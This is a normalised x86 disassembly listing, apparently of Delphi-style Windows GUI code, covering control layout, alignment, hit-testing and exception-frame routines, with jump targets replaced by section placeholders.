mov eax [ ebx + 0xa0 ]
call sub_4033e4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43ad00
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43ad20
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
mov eax edi
call sub_43ad60
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43ad8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43adb8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4068a0
mov eax esp
call sub_4123c8
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_438584
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403454
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403454
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4385b0
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4123c8
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412350
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_438558
sub_43aee0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43af20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437784
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43af54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43b04c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_437b40
push ebx
push sub_43c9e4
call sub_41a1f0
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c808
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41c9b0
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403564
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456440
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fe4
lea eax [ ebx + 0x188 ]
call sub_403f90
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b053
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_43b053
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_43b078
push ebx
push esi
push edi
call sub_4035cc
mov ebx edx
mov edi eax
mov eax edi
call sub_4193ec
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4055cc
mov eax [ edi + 0x178 ]
call sub_403258
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_4366ec
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43bd18
mov eax edi
call sub_43bf58
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403258
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43bf1c
mov esi eax
mov edx esi
mov eax edi
call sub_43bd84
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43bf58
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_437c18
test bl bl
jle r-xdata
call sub_41a288
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
sub_43b148
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43b20c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41394c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43f3e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4137ac
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4138a0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4137ac
test eax eax
je r-xdata
sub_43b21c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor eax eax
push ebp
push sub_43b25c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437e7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b263
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
sub_43b263
mov eax [ ebp - 0x4 ]
call sub_43b148
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c91c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_439bf4
sub_43b298
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43b2b3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43b324
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43f52c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412350
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43b6a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b6ac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43b5ba ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43b51d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43b6ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43b6db ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43b764
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43bf58
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413650
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4137ac
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43b324
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43bf1c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413828
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4137ac
mov edx eax
mov ecx ebx
mov eax edi
call sub_43b298
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43b8d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43bf58
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43bf1c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43bf1c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43b928
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43b8d4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43ba07
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43b764
pop ecx
push ebp
mov al 0x2
call sub_43b764
pop ecx
push ebp
mov al 0x3
call sub_43b764
pop ecx
push ebp
mov al 0x4
call sub_43b764
pop ecx
push ebp
mov al 0x5
call sub_43b764
pop ecx
push ebp
mov al 0x6
call sub_43b764
pop ecx
push ebp
xor eax eax
call sub_43b764
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43ba2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor eax eax
push ebp
push sub_43bab3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43baf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43bbb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_438444
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bbbc
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413650
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4381b0
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4137ac
xor ecx ecx
mov edx 0xb03e
call sub_439bf4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43bbc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bf58
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor edx edx
push ebp
push sub_43bcab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413650
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4137ac
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bf1c
